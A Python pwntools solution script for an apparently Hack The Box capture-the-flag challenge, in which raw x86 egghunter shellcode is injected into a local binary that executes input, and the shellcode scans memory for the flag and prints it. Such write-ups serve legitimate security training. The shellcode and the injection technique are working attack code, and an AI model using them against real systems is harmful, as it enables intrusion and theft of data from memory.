import pwn

# hunting is a 32-bit dynamically linked, stripped binary
# PIE is enabled, ASLR is on

# This binary is a pain to RE, but its functionality is quite simple
# It takes up to 60 bytes of user input, and runs that input as shellcode
# It also places a flag HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX} at a randomized memory location

# So basically, this entire challenge is writing the shellcode to find the flag
# That is what an egghunter does, but we are searching for a flag instead of shellcode
# shellcode.asm contains detailed documentation of what the shellcode is doing

# Shellcode from shellcode.asm
shellcode = b'\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80'

if len(shellcode) > 60:
    print(f"shellcode of length: {len(shellcode)} > 60. Too long!")

target = pwn.process('./hunting')

target.sendline(shellcode)

flag = target.recv()
print(flag)